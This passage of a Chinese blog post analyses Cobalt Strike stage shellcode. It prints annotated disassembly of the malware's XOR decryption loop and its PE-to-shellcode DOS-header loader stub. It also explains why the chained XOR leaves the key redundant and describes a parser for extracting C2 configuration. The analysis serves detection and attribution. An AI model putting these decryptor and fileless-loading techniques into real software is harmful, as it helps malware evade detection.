<span class="number">0x001a</span>:  8B <span class="number">75</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">esi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;获取5-8个字节，即异或key得到内容长度</span>
<span class="number">0x001d</span>:  <span class="number">31</span> FE             <span class="keyword">xor</span>  <span class="built_in">esi</span>, <span class="built_in">edi</span>             <span class="comment">;esi=内容长度</span>
<span class="number">0x001f</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span> 
<span class="number">0x0022</span>:  <span class="number">55</span>                <span class="keyword">push</span> <span class="built_in">ebp</span>                  <span class="comment">;加密的shellcode地址入栈，提供后续调用</span>
<span class="comment">;============================================= 循环xor解密 ====================================================</span>
<span class="number">0x0023</span>:  8B <span class="number">5D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">ebx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>] <span class="comment">;每4字节为一组进行异或解密</span>
<span class="number">0x0026</span>:  <span class="number">31</span> FB             <span class="keyword">xor</span>  <span class="built_in">ebx</span>, <span class="built_in">edi</span>
<span class="number">0x0028</span>:  <span class="number">89</span> <span class="number">5D</span> <span class="number">00</span>          <span class="keyword">mov</span>  <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>], <span class="built_in">ebx</span>
<span class="number">0x002b</span>:  <span class="number">31</span> DF             <span class="keyword">xor</span>  <span class="built_in">edi</span>, <span class="built_in">ebx</span>
<span class="number">0x002d</span>:  <span class="number">83</span> C5 <span class="number">04</span>          <span class="keyword">add</span>  <span class="built_in">ebp</span>, <span class="number">4</span>
<span class="number">0x0030</span>:  <span class="number">83</span> EE <span class="number">04</span>          <span class="keyword">sub</span>  <span class="built_in">esi</span>, <span class="number">4</span>
<span class="number">0x0033</span>:  <span class="number">31</span> <span class="built_in">DB</span>             <span class="keyword">xor</span>  <span class="built_in">ebx</span>, <span class="built_in">ebx</span>
<span class="number">0x0035</span>:  <span class="number">39</span> DE             <span class="keyword">cmp</span>  <span class="built_in">esi</span>, <span class="built_in">ebx</span>
<span class="number">0x0037</span>:  <span class="number">74</span> <span class="number">02</span>             <span class="keyword">je</span>   <span class="number">0x3b</span>                   <span class="comment">;根据长度判断解密完毕</span>
<span class="number">0x0039</span>:  EB E8             <span class="keyword">jmp</span>  <span class="number">0x23</span>
<span class="number">0x003b</span>:  5F                <span class="keyword">pop</span>  <span class="built_in">edi</span>                    <span class="comment">;取出Shellcode地址</span>
<span class="number">0x003c</span>:  FF E7             <span class="keyword">jmp</span>  <span class="built_in">edi</span>                    <span class="comment">;执行解密后的shellcode</span>
<span class="number">0x003e</span>:  E8 D0 FF FF FF    <span class="keyword">call</span> <span class="number">0x13</span>                   <span class="comment">;获取下一指令的地址</span>
</code></pre>
<p>我们通过CS源码和汇编解密注意到这么循环加密的操作是<strong>有一些小问题的</strong>：因为xor_key没有起到其应有的作用，每个4字节长加密的数据块可以通过和上一块数据块进行异或直接获取到明文。</p>
<p>我们简单画个图说明一下CS的异或加密方式：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174422078.png" alt="image-20201021174422078"></p>
<p>简单地用公式表示为：</p>
<p>$$<br>
\begin{align}<br>
C_1 &amp;= P_1{\oplus}Key \<br>
C_2 &amp;= C_1{\oplus}P_2 \<br>
C_3 &amp;= C_2{\oplus}P_3 \<br>
… \<br>
C_n &amp;= C_{n-1}{\oplus}P_n<br>
\end{align}<br>
$$</p>
<p>那么由于异或的特性，我们有：</p>
<p>$$<br>
\begin{align}<br>
P_2 &amp;= C_1{\oplus}C_2 \<br>
P_3 &amp;= C_2{\oplus}C_3 \<br>
… \<br>
P_n &amp;= C_{n-1}{\oplus}C_n<br>
\end{align}<br>
$$</p>
<p>也就是说这种加密方式根本不需要xor_key也能直接得到明文Shellcode，当然，从公式来看前四字节的明文还是需要xor_key的。但是后面我们就会知道，这段加密的Shellcode使用了<strong>PE_TO_SHELLCODE</strong>技术，前四字节是PE头标志 <code>&quot;MZ&quot;</code>以及<code>call</code> 下一行或加了<code>junk code</code>偏移之后的字节码<code>\xE8\x&lt;??&gt;\x00\x00\x00</code>，即前三个字节是固定的<code>\x4D\x5A\xE8\x&lt;??&gt;</code>，而<code>\x&lt;??&gt;</code>可以通过还原后面的跳转偏移还原出来，一句话总结就是：这种加密方式无需<code>xor_key</code>即可还原成明文，即加密无效。</p>
<p>当然，既然CS在Stage中传输了<code>xor_key</code>那么就必然不是因为防止被解密而进行的异或加密，而它的主要目的就是防止静态查杀。只是从加解密的角度来看，<code>xor_key</code>的传输稍显“多余”的。</p>
<h3 id="2-动手实践"><a class="markdownIt-Anchor" href="#2-动手实践"></a> 2. 动手实践</h3>
<p>解析了<code>Stage</code>结构之后，我们可以由此解密出的<code>Stage Shellcode</code>。</p>
<p>开源项目<a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener">[CobaltStrikeParser]</a>对<strong>解密后的Shellcode</strong>进行配置解析，原本该项目是<strong>用于解析CS dump 内存或PE的</strong>， 现在被我们用来直接解析下载过程中包含的Stage Shellcode（本质上就是解密后的PE文件）。我们直接拿过来封装一层解密以及添加一些Shellcode类型判断即可。</p>
<p>所谓<strong>磨刀不误砍柴工</strong>，若以后再次抓到样本的通信流量就可以快速地得到CS配置信息，从而快速判断攻 击手法和C&amp;C服务器进行溯源。</p>
<p>由于32位的shellcode会随即填充一些垃圾数据避免静态查杀，而64位不会，则我们直接用xor64.bin判断是否是64位的shellcode即可。</p>
<p>效果如下图，<strong>cs_stage_parse</strong>（有时间再上github吧）：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201022173817069.png" alt="image-20201022173817069"></p>
<h3 id="3-pe-to-shellcode"><a class="markdownIt-Anchor" href="#3-pe-to-shellcode"></a> 3. PE to Shellcode</h3>
<p>CS将装载有较完整的恶意功能的PE可执行文件通过<strong>PE_TO_SHELLCODE</strong>技术变成了既可以内存加载执行，也可以像正常EXE文件双击执行的格式。当然，这么做主要还是想将PE文件当做Shellcode执行，从而达到无文件落地目的。</p>
<p><strong>注：这一节将不会重点展开，因为这一技术并非</strong>Shellcode<strong>的重点。</strong></p>
<p><strong>PE_TO_SHELLCODE</strong>技术的大致思路就是利用DOS头的标志 <code>&quot;MZ&quot;</code> 字符字节码 <code>\x4D\x5A</code>正好对应着汇编的<code>dec ebp</code>和 <code>pop edx</code>，<code>EIP</code>若指向这里运行则不会崩溃，可以通过<code>push edx</code>和<code>inc ebp</code>进行补救。而我们知道DOS头中比较重要的字段就是开头的 <code>MZ</code>标识和 PE头的偏移字段 <code>elfanew</code>，只 要这两个字段正确，就能识别为正确的PE文件。故可以在DOS头中添加Shellcode，使在不破坏DOS头关键字段的前提下跳转到Stub处执行，而Stub则充当<code>PE Loader</code>的作用，将PE 正常地映射在内存中然后跳转到程序入口执行。</p>
<p>CS的PE文件DOS头解析成汇编后如下：</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x00000</span>:  <span class="number">4D</span>                 <span class="keyword">dec</span>  <span class="built_in">ebp</span>    <span class="comment">;"M"</span>
<span class="number">0x00001</span>:  5A                 <span class="keyword">pop</span>  <span class="built_in">edx</span>    <span class="comment">;"Z"</span>
<span class="number">0x00002</span>:  E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">call</span> <span class="number">7</span>      <span class="comment">;call下一行，即下一行地址入栈</span>
<span class="number">0x00007</span>:  5B                 <span class="keyword">pop</span>  <span class="built_in">ebx</span>    <span class="comment">;ebx=下一行地址   </span>
<span class="number">0x00008</span>:  <span class="number">89</span> DF              <span class="keyword">mov</span>  <span class="built_in">edi</span>, <span class="built_in">ebx</span> <span class="comment">;</span>
<span class="number">0x0000a</span>:  <span class="number">52</span>                 <span class="keyword">push</span> <span class="built_in">edx</span>    <span class="comment">;抵消pop edx</span>
<span class="number">0x0000b</span>:  <span class="number">45</span>                 <span class="keyword">inc</span>  <span class="built_in">ebp</span>    <span class="comment">;抵消dec ebp</span>
<span class="number">0x0000c</span>:  <span class="number">55</span>                 <span class="keyword">push</span> <span class="built_in">ebp</span>    <span class="comment">;保存栈底</span>
<span class="number">0x0000d</span>:  <span class="number">89</span> E5              <span class="keyword">mov</span>  <span class="built_in">ebp</span>, <span class="built_in">esp</span> <span class="comment">;调整栈帧</span>
<span class="number">0x0000f</span>:  <span class="number">81</span> C3 <span class="number">55</span> <span class="number">91</span> <span class="number">00</span> <span class="number">00</span>  <span class="keyword">add</span>  <span class="built_in">ebx</span>, <span class="number">0x9155</span> <span class="comment">;跳到Stub</span>
<span class="number">0x00015</span>:  FF D3              <span class="keyword">call</span> <span class="built_in">ebx</span>         
<span class="number">0x00017</span>:  <span class="number">68</span> F0 B5 A2 <span class="number">56</span>     <span class="keyword">push</span> <span class="number">0x56a2b5f0</span>
<span class="number">0x0001c</span>:  <span class="number">68</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">push</span> <span class="number">4</span>
<span class="number">0x00021</span>:  <span class="number">57</span>                 <span class="keyword">push</span> <span class="built_in">edi</span>
<span class="number">0x00022</span>:  FF D0              <span class="keyword">call</span> <span class="built_in">eax</span>      <span class="comment">;同样地用Hash调用函数</span>
</code></pre>
<p>同样的，开源项目<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">[PE_TO_SHELLCODE]</a>可以将PE转换为Shellcode，其思路大致一致，将充当<code>PE Loader</code>作用的Stub放到了PE文件末尾，理由DOS头的Shellcode跳转到Stub加载PE文件到内存并跳转到程序入口。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201022193600401.png" alt="image-20201022193600401"></p>
<p>后续便是一系列的C&amp;C通信步骤，<strong>至此Shellcode分析结束</strong> 。</p>
<p>具体PE文件中包含的配置信息是如何解析的，请参考开源项目<a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener">[CobaltStrikeParser]</a></p>
<div style="page-break-after: always;"></div> 
<h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2>
<p><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html" target="_blank" rel="noopener">InMemoryOrderModuleList Documentation - I’m confused</a></p>
<p><a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/" target="_blank" rel="noopener">[JOSH STROSCHEIN] - Locating DLL Name from the Process Environment Block (PEB) </a></p>
<p><a href="https://www.cnblogs.com/dsky/archive/2012/02/23/2364503.html" target="_blank" rel="noopener">[梦想SKY] - 通过PEB的Ldr枚举进程内所有已加载的模块</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener">[Microsoft] - PE Format</a></p>
<p><a href="https://www.cnblogs.com/Crazycatmiao/p/6731477.html" target="_blank" rel="noopener">[CRAZYC4T] - CONTAINING_RECORD</a></p>
<p><a href="https://blog.twofei.com/546/" target="_blank" rel="noopener">[movsb] - 我对CONTAINING_RECORD宏的详细解释</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/">https://www.testzero-wz.com/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/利用分析/"># 利用分析</a>
                    
                        <a href="/tag/码代码/"># 码代码</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2020/08/11/LM、NTLM与Net-NTLM/">LM？NTLM？Net NTLM？</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
<script src="/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>
